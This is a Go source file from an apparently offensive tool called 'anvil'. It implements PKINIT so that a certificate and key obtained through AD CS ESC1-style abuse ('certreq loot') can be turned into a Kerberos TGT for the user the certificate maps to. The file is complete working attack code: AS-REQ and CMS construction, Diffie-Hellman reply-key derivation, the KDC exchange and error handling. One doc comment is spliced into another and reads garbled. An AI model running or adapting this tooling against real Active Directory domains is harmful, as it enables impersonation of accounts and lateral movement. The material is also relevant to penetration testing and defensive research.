// Package pkinit implements PKINIT (RFC 4556) certificate-to-TGT
// authentication for anvil: the operator takes a certificate+key PEM
// (typically certreq loot from an AD CS ESC1-style issuance) and gets a
// Kerberos TGT for the user the certificate maps to.
//
// The request always offers Diffie-Hellman key agreement (RFC 4556
// §3.2.1: clientPublicValue + clientDHNonce in the AuthPack); the RSA
// key transport reply path is kept as a fallback. Live verification
// against a Windows Server 2022 KDC drove that choice: RSA-mode requests
// came back KRB_ERR_GENERIC, and a controlled replay (certipy's request
// rebuilt without clientPublicValue) showed the KDC answering RSA mode
// with KDC_ERR_ETYPE_NOSUPP — the RSA-mode reply encryption RFC 4556
// §3.1.2 mandates is 3DES-CBC, which hardened KDCs no longer use.
// certipy, minikerberos and Rubeus all default to DH for this reason.
//
// Provenance of every structure on the wire:
//
//   - PA-PK-AS-REQ (padata-type 16): RFC 4556 §3.2.1 and Appendix A.
//     SEQUENCE { signedAuthPack [0] IMPLICIT OCTET STRING } whose
//     content octets are the DER of a CMS ContentInfo (RFC 3852 §3)
//     holding a SignedData. The module is DEFINITIONS EXPLICIT TAGS;
//     the IMPLICIT keyword on signedAuthPack overrides that default.
//   - AuthPack / PKAuthenticator: RFC 4556 §3.2.1 — pkAuthenticator
//     [0] EXPLICIT (cusec/ctime/nonce/paChecksum [0..3] EXPLICIT;
//     paChecksum is the SHA-1 checksum over the KDC-REQ-BODY and is
//     mandatory in practice — a KDC that misses it answers
//     KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED), clientPublicValue [1]
//     EXPLICIT (DH group + public value, see dh.go), clientDHNonce [3]
//     EXPLICIT. Structure shapes cross-checked against certipy's
//     structs.py, which is byte-verified against Windows KDCs.
//   - CMS SignedData over the AuthPack: RFC 3852 §5.1, eContentType
//     id-pkinit-authData 1.3.6.1.5.2.3.1 (RFC 4556 §3.2.1 item 2). See
//     cms.go for why the SignedData is the minimal form.
//   - PA-PK-AS-REP (padata-type 17): RFC 4556 §3.2.3 — CHOICE {
//     dhInfo [0] EXPLICIT DHRepInfo, encKeyPack [1] IMPLICIT OCTET
//     STRING }. dhInfo (the expected reply) holds a CMS SignedData from
//     the KDC whose eContent is KDCDHKeyInfo → shared secret → reply key
//     (§3.2.3.1, implemented in dh.go). encKeyPack (fallback) holds a
//     ContentInfo (id-envelopedData) → EnvelopedData →
//     KeyTransRecipientInfo (RSAES-PKCS1-v1_5 to the client cert) →
//     inner ContentInfo (SignedData) → ReplyKeyPack → replyKey
//     (§3.2.3.2, kept in cms.go).
//   - Reply key usage: the AS-REP enc-part is decrypted with the reply
//     key at key usage 3 (AS-REP encpart), same as the password path —
//     PKINIT changes how the reply key is delivered, not how it is used.
//   - Error codes 60–81: RFC 4556 §3.1.3 (gokrb5's iana/errorcode table
//     ends at 76; 77–81 are named from the RFC text).
package pkinit

import (
	"bytes"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/asn1"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/config"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/crypto"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/errorcode"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/flags"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/keyusage"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/patype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/messages"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// ParsePEMCertKey parses the certreq loot format: one PEM file holding a
// CERTIFICATE block and a private key block. certreq writes the key as
// PKCS#8 ("PRIVATE KEY"); a PKCS#1 block ("RSA PRIVATE KEY") is accepted
// too so hand-converted keys work. The cert and key are checked to be an
// RSA pair — PKINIT RSA mode has no use for a mismatched or non-RSA
// pair, and catching it here beats a KDC-side signature rejection.
func ParsePEMCertKey(certPEM []byte) (*x509.Certificate, *rsa.PrivateKey, error) {
	var cert *x509.Certificate
	var key *rsa.PrivateKey
	rest := certPEM
	for {
		var block *pem.Block
		block, rest = pem.Decode(rest)
		if block == nil {
			break
		}
		switch block.Type {
		case "CERTIFICATE":
			if cert != nil {
				continue // first cert wins; extra chain blocks are ignored
			}
			c, err := x509.ParseCertificate(block.Bytes)
			if err != nil {
				return nil, nil, fmt.Errorf("parsing the CERTIFICATE block: %v", err)
			}
			cert = c
		case "PRIVATE KEY":
			k, err := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err != nil {
				return nil, nil, fmt.Errorf("parsing the PRIVATE KEY block (PKCS#8): %v", err)
			}
			rsaKey, ok := k.(*rsa.PrivateKey)
			if !ok {
				return nil, nil, fmt.Errorf("the private key is %T, not RSA — PKINIT RSA mode needs an RSA key", k)
			}
			key = rsaKey
		case "RSA PRIVATE KEY":
			k, err := x509.ParsePKCS1PrivateKey(block.Bytes)
			if err != nil {
				return nil, nil, fmt.Errorf("parsing the RSA PRIVATE KEY block (PKCS#1): %v", err)
			}
			key = k
		}
	}
	if cert == nil {
		return nil, nil, fmt.Errorf("no CERTIFICATE block found — expected the certreq cert+key PEM pair")
	}
	if key == nil {
		return nil, nil, fmt.Errorf("no PRIVATE KEY block found — expected the certreq cert+key PEM pair")
	}
	pub, ok := cert.PublicKey.(*rsa.PublicKey)
	if !ok {
		return nil, nil, fmt.Errorf("the certificate's public key is %T, not RSA — PKINIT RSA mode needs an RSA certificate", cert.PublicKey)
	}
	if pub.N.Cmp(key.N) != 0 {
		return nil, nil, fmt.Errorf("the private key does not match the certificate — not the pair certreq wrote")
	}
	return cert, key, nil
}

// TGTWithCert performs one PKINIT AS exchange: it signs an AuthPack with
// the certificate's key, sends the AS-REQ for user@REALM (the domain
// uppercased) to the KDC at dcIP over TCP/88, unwraps the RSA reply key,
// and returns the TGT in the shape kerberos.SaveTGT consumes. The ccache
// is deliberately not written here.
func TGTWithCert(domain, dcIP, user string, cert *x509.Certificate, key *rsa.PrivateKey, timeout time.Duration) (*kerberos.TGTResult, error) {
	realm := strings.ToUpper(domain)
	if timeout <= 0 {
		timeout = 10 * time.Second
	}

	// AS-REQ construction mirrors gopacket's pkg/kerberos/gettgt.go,
	// with two PKINIT-specific changes to the etype list: the list names
	// the AS reply key's possible enctypes (AES is the RFC 4556 §3.1.1
	// mandatory baseline), and RC4 must stay out of it — certipy's
	// hard-won note "23 breaks" refers to Windows PKINIT rejecting or
	// mishandling RC4 reply keys.
	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	// Defense-in-depth parity with gettgt.go: networking below is a
	// direct net.Dial, so the opsec keys are no-ops today; stamping them
	// keeps a future gokrb5-client refactor proxy/DNS-safe.
	kerberos.ApplyKrb5OpsecDefaults(cfg)
	cfg.LibDefaults.DefaultTktEnctypes = []string{"aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"}
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{18, 17}
	cfg.LibDefaults.Forwardable = true

	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)
	asReq, err := messages.NewASReq(realm, cfg, cName, sName)
	if err != nil {
		return nil, fmt.Errorf("failed to create AS-REQ: %v", err)
	}

	// Body tuning to certipy's wire shape (all verified against its live
	// AS-REQ): renewable + renew-till, renewable-ok, and a PA-PAC-REQUEST
	// ahead of the PKINIT padata. None of it feeds the PKINIT validation
	// itself, but the KDC's ticket path wants it, and the paChecksum below
	// must cover the FINAL body, so it lands before the hash.
	types.SetFlag(&asReq.ReqBody.KDCOptions, flags.Renewable)
	types.SetFlag(&asReq.ReqBody.KDCOptions, flags.RenewableOK)
	asReq.ReqBody.RTime = asReq.ReqBody.Till
	asReq.PAData = append(asReq.PAData, types.PAData{
		PADataType:  patype.PA_PAC_REQUEST,
		PADataValue: mustMarshalPACRequest(),
	})

	// paChecksum = SHA-1 over the DER of the KDC-REQ-BODY (RFC 4556
	// §3.2.1). The field is syntactically OPTIONAL but the RFC says it
	// MUST be present, and a conforming KDC answers a missing checksum
	// with KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED; certipy sends it in DH
	// mode too. It must cover the exact body bytes that go on the wire;
	// gokrb5's Marshal() re-derives them deterministically from the same
	// struct, so hashing ReqBody.Marshal() here matches the final AS-REQ.
	bodyDER, err := asReq.ReqBody.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshaling the AS-REQ body: %v", err)
	}
	paChecksum := sha1.Sum(bodyDER)

	// Ephemeral Diffie-Hellman state for the reply key agreement — the
	// mode modern Windows KDCs actually answer (see package doc).
	dh, err := newDHClient()
	if err != nil {
		return nil, err
	}

	now := time.Now().UTC()
	paValue, err := buildPAPKASReq(now, asReq.ReqBody.Nonce, paChecksum[:], cert, key, dh)
	if err != nil {
		return nil, err
	}
	if os.Getenv("PKINIT_DEBUG") != "" {
		fmt.Fprintf(os.Stderr, "DEBUG paValue (%d): %x\n", len(paValue), paValue)
	}
	asReq.PAData = append(asReq.PAData, types.PAData{
		PADataType:  patype.PA_PK_AS_REQ,
		PADataValue: paValue,
	})

	b, err := asReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal AS-REQ: %v", err)
	}
	if os.Getenv("PKINIT_DEBUG") != "" {
		fmt.Fprintf(os.Stderr, "DEBUG asreq (%d): %x\n", len(b), b)
	}

	respBuf, err := exchangeKDC(dcIP, b, timeout)
	if err != nil {
		return nil, err
	}

	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		var krbErr messages.KRBError
		if e2 := krbErr.Unmarshal(respBuf); e2 == nil {
			return nil, pkinitError(krbErr)
		}
		return nil, fmt.Errorf("failed to unmarshal the KDC reply: %v", err)
	}

	// The reply key arrives in the PA-PK-AS-REP padata (type 17).
	var paPKASREP []byte
	for _, pa := range asRep.PAData {
		if pa.PADataType == patype.PA_PK_AS_REP {
			paPKASREP = pa.PADataValue
			break
		}
	}
	if paPKASREP == nil {
		return nil, fmt.Errorf("the AS-REP carries no PA-PK-AS-REP — the KDC did not answer with PKINIT")
	}
	replyKey, err := unwrapPAPKASREP(paPKASREP, key, dh, asRep.EncPart.EType)
	if err != nil {
		return nil, err
	}

	// gokrb5's DecryptEncPart picks the cipher from the KEY's KeyType, so
	// stamp the enc-part's etype onto the unwrapped key bytes. The DH
	// derivation already sized the key for this etype, and the ReplyKeyPack
	// in the RSA branch names the same one — the enc-part header describes
	// the bytes we actually decrypt either way.
	replyKey.KeyType = asRep.EncPart.EType
	dec, err := crypto.DecryptEncPart(asRep.EncPart, replyKey, keyusage.AS_REP_ENCPART)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt the AS-REP enc-part with the PKINIT reply key: %v", err)
	}
	var encPart messages.EncKDCRepPart
	if err := encPart.Unmarshal(dec); err != nil {
		return nil, fmt.Errorf("failed to parse the decrypted AS-REP enc-part: %v", err)
	}
	if encPart.Nonce != asReq.ReqBody.Nonce {
		return nil, fmt.Errorf("the nonce in the AS-REP does not match our AS-REQ — refusing a reply we cannot bind to our request")
	}

	ticketBytes, err := asRep.Ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal the ticket: %v", err)
	}

	return &kerberos.TGTResult{
		Ticket:     ticketBytes,
		SessionKey: encPart.Key,
		CName:      asRep.CName,
		SName:      sName,
		Realm:      realm,
		AuthTime:   encPart.AuthTime,
		EndTime:    encPart.EndTime,
		RenewTill:  encPart.RenewTill,
		// Same flags constant gettgt.go stamps: forwardable, proxiable,
		// renewable, initial, pre_authent, enc_pa_rep. A PKINIT TGT is
		// initial and pre-authenticated by construction.
		Flags: 0x50e10000,
	}, nil
}

// buildPAPKASReq marshals the padata-value for PA_PK-AS-REQ (type 16):
// SEQUENCE { signedAuthPack [0] IMPLICIT OCTET STRING } where the [0]
// content is the DER of the CMS ContentInfo over the AuthPack (RFC 4556
// §3.2.1). The PKAuthenticator reuses the request body's nonce — the RFC
// mustMarshalPACRequest renders the PA-PAC-REQUEST value (include-pac
// TRUE): SEQUENCE { [0] BOOLEAN TRUE } — the fixed 7-byte DER certipy
// sends ahead of its PKINIT padata (byte-verified against its AS-REQ).
func mustMarshalPACRequest() []byte {
	return []byte{0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0xff}
}

// explicitly allows any random nonce ("does not need to match" the
// KDC-REQ-BODY nonce), and reuse is one less random draw to get wrong.
func buildPAPKASReq(now time.Time, nonce int, paChecksum []byte, cert *x509.Certificate, key *rsa.PrivateKey, dh *dhClient) ([]byte, error) {
	authPack := buildAuthPack(now, nonce, paChecksum, dh)
	contentInfo, err := buildSignedData(oidPKINITAuthData, authPack, cert, key, now)
	if err != nil {
		return nil, err
	}
	return tlv(tagSequence, implicitOctetString(0, contentInfo)), nil
}

// buildAuthPack marshals AuthPack (RFC 4556 §3.2.1, EXPLICIT TAGS module
// default). With the DH exchange present the full client offer is:
//
//	pkAuthenticator   [0] EXPLICIT PKAuthenticator
//	clientPublicValue [1] EXPLICIT SubjectPublicKeyInfo — our DH public
//	clientDHNonce     [3] EXPLICIT OCTET STRING (DHNonce)
//
// supportedCMSTypes [2] stays absent (certipy omits it too). The
// PKAuthenticator fields are unchanged and remain explicitly tagged:
//
//	cusec      [0] EXPLICIT INTEGER        — microseconds within ctime
//	ctime      [1] EXPLICIT KerberosTime   — GeneralizedTime, seconds
//	nonce      [2] EXPLICIT INTEGER        — replay binding
//	paChecksum [3] EXPLICIT OCTET STRING   — SHA-1 over KDC-REQ-BODY
//
// A nil dh yields the RSA-mode request shape (pkAuthenticator only),
// kept for tests of the fallback path.
func buildAuthPack(now time.Time, nonce int, paChecksum []byte, dh *dhClient) []byte {
	pkAuth := tlv(tagSequence, bytes.Join([][]byte{
		explicit(0, intTLV(now.Nanosecond()/1000)),
		explicit(1, generalizedTimeTLV(now)),
		explicit(2, intTLV(nonce)),
		explicit(3, octetTLV(paChecksum)),
	}, nil))
	parts := [][]byte{explicit(0, pkAuth)}
	if dh != nil {
		parts = append(parts,
			explicit(1, buildClientPublicValue(dh.pub)),
			explicit(3, octetTLV(dh.nonce)),
		)
	}
	return tlv(tagSequence, bytes.Join(parts, nil))
}

// unwrapPAPKASREP peels the PA-PK-AS-REP CHOICE (RFC 4556 §3.2.3) and
// extracts the AS reply key. dhInfo [0] — the Diffie-Hellman reply — is
// the expected branch (it is what we offered and what modern Windows
// KDCs answer); encKeyPack [1] — RSA key transport — is kept as a
// fallback for KDCs that still speak it.
func unwrapPAPKASREP(paValue []byte, key *rsa.PrivateKey, dh *dhClient, etype int32) (types.EncryptionKey, error) {
	var choice asn1.RawValue
	if _, err := asn1.Unmarshal(paValue, &choice); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parsing the PA-PK-AS-REP: %v", err)
	}
	if choice.Class != asn1.ClassContextSpecific {
		return types.EncryptionKey{}, fmt.Errorf("the PA-PK-AS-REP is not the expected CHOICE encoding")
	}
	switch choice.Tag {
	case 0:
		// dhInfo [0] EXPLICIT DHRepInfo: the content octets are the
		// DHRepInfo SEQUENCE.
		if dh == nil {
			return types.EncryptionKey{}, fmt.Errorf("the KDC answered with a Diffie-Hellman PKINIT reply but we offered no DH public value")
		}
		return unwrapDHInfo(choice.Bytes, dh, etype)
	case 1:
		// encKeyPack [1] IMPLICIT OCTET STRING: content octets are the
		// DER of the ContentInfo holding the EnvelopedData (RSA branch).
		return unwrapReplyKeyPack(choice.Bytes, key)
	default:
		return types.EncryptionKey{}, fmt.Errorf("unexpected PA-PK-AS-REP CHOICE tag %d", choice.Tag)
	}
}

// maxKDCReply caps the TCP-framed KDC reply before allocation, same
// rationale as internal/scan/krb.go: a hostile peer must not size our
// buffer. A PKINIT AS-REP carries CMS blobs with certificates and stays
// in the low kilobytes.
const maxKDCReply = 1 << 20

// exchangeKDC performs the single-request/single-reply TCP exchange with
// the KDC on port 88: a 4-byte big-endian length prefix per RFC 4120
// §7.2.2, one deadline over the whole exchange (mirrors the framing in
// internal/scan/krb.go).
func exchangeKDC(dcIP string, req []byte, timeout time.Duration) ([]byte, error) {
	addr := net.JoinHostPort(dcIP, "88")
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to KDC %s: %v", addr, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))

	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(req)))
	if _, err := conn.Write(append(hdr[:], req...)); err != nil {
		return nil, fmt.Errorf("failed to send the AS-REQ: %v", err)
	}
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return nil, fmt.Errorf("failed to read the reply length: %v", err)
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > maxKDCReply {
		return nil, fmt.Errorf("implausible KDC reply length %d", n)
	}
	body := make([]byte, n)
	if _, err := io.ReadFull(conn, body); err != nil {
		return nil, fmt.Errorf("failed to read the KDC reply: %v", err)
	}
	return body, nil
}

// krbErrorInfo pairs a symbolic KDC error name with its plain-language
// meaning on the PKINIT path.
type krbErrorInfo struct {
	name string
	text string
}

// pkinitErrorInfos covers the PKINIT error family (RFC 4556 §3.1.3) plus
// the generic RFC 4120 codes that actually surface on this exchange.
// gokrb5's iana/errorcode table ends at 76; the names for 77–81 come
// from the RFC 4556 text, as does 65's name (iana calls the same code
// KDC_ERR_KEY_TOO_WEAK).
var pkinitErrorInfos = map[int32]krbErrorInfo{
	6:  {"KDC_ERR_C_PRINCIPAL_UNKNOWN", "user not found in the Kerberos database"},
	16: {"KDC_ERR_PADATA_TYPE_NOSUPP", "the KDC does not support the PKINIT pre-authentication type"},
	25: {"KDC_ERR_PREAUTH_REQUIRED", "the KDC requires additional pre-authentication"},
	37: {"KRB_AP_ERR_SKEW", "clock skew too great — sync time with the DC"},
	60: {"KRB_ERR_GENERIC", "the KDC rejected PKINIT authentication — on Windows this is the catch-all for certificate trust and mapping failures"},
	62: {"KDC_ERR_CLIENT_NOT_TRUSTED", "the KDC does not trust the client certificate"},
	64: {"KDC_ERR_INVALID_SIG", "the KDC rejected the signature on the request"},
	65: {"KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED", "the KDC rejected the Diffie-Hellman key parameters"},
	66: {"KDC_ERR_CERTIFICATE_MISMATCH", "the certificate does not match the requested client"},
	70: {"KDC_ERR_CANT_VERIFY_CERTIFICATE", "the KDC could not verify the certificate chain to a trusted CA"},
	71: {"KDC_ERR_INVALID_CERTIFICATE", "the client certificate failed validation at the KDC"},
	72: {"KDC_ERR_REVOKED_CERTIFICATE", "the client certificate has been revoked"},
	73: {"KDC_ERR_REVOCATION_STATUS_UNKNOWN", "the KDC could not determine the certificate's revocation status"},
	74: {"KDC_ERR_REVOCATION_STATUS_UNAVAILABLE", "the KDC could not reach a revocation source for the certificate"},
	75: {"KDC_ERR_CLIENT_NAME_MISMATCH", "the certificate is not bound to the requested user (SAN/UPN mapping failed)"},
	76: {"KDC_ERR_KDC_NAME_MISMATCH", "the KDC's certificate name does not match the realm"},
	77: {"KDC_ERR_INCONSISTENT_KEY_PURPOSE", "the certificate lacks the PKINIT client-auth EKU"},
	78: {"KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED", "the certificate is signed with a digest the KDC does not accept"},
	79: {"KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED", "the KDC requires the PA checksum (anvil always sends it)"},
	80: {"KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED", "the KDC does not accept the SignedData digest algorithm"},
	81: {"KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED", "the KDC does not support RSA key transport"},
}

// pkinitError renders a KRB-ERROR from the PKINIT exchange in plain
// language, keeping the symbolic name and appending the KDC's e-text
// when it carries one (Windows often packs the real cause there,
// especially for the KRB_ERR_GENERIC catch-all).
func pkinitError(e messages.KRBError) error {
	if info, ok := pkinitErrorInfos[e.ErrorCode]; ok {
		if e.EText != "" {
			return fmt.Errorf("%s (%s) — KDC detail: %s", info.text, info.name, e.EText)
		}
		return fmt.Errorf("%s (%s)", info.text, info.name)
	}
	if e.EText != "" {
		return fmt.Errorf("KDC error %s: %s", errorcode.Lookup(e.ErrorCode), e.EText)
	}
	return fmt.Errorf("KDC error %s", errorcode.Lookup(e.ErrorCode))
}
